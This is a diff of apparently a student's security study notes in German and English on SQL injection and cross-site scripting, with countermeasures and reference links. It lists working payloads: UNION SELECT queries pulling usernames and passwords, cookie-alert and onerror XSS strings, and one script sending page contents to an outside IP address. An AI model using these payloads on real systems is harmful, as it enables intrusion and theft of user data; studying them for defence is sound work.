@@ -5,7 +5,7 @@ __" OR 1 = 1 #__ in das login-Username feld eingetragen wird. Hierdurch kann man
 ### Union Attack 
 Query kann herausgefunden werden, indem man __%'__ in das suchfeld postet oder __"__ in das login-feld.
 __%' ORDER BY 4--__ to find out how many columns are in the table since this is important for the attack.
-__%' UNION SELECT NULL, NULL, username, passw, NULL FROM Users --__ to return userdata.
+__%' UNION SELECT NULL, username, passw, NULL, NULL FROM Users --__ to return userdata.
 
 ## Maßnahmen
 Escaping query values:
@@ -19,7 +19,8 @@ https://www.imperva.com/learn/application-security/reflected-xss-attacks/#:~:tex
 https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
 ```js
 <script>alert(document.cookie); </script>
-<img src="http://url.to.file.which/not.exist" onerror= document.body.innerHTML = "<h1>You got hacked</h1>";>
+<img src="http://url.to.file.which/not.exist" onerror= window.open("https://www.google.com");>
+<img src="http://url.to.file.which/not.exist" onerror= alert();>
 <IMG SRC=j&#X41vascript:alert('test2')>
 <script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.body.innerHTML</script>
 <img 
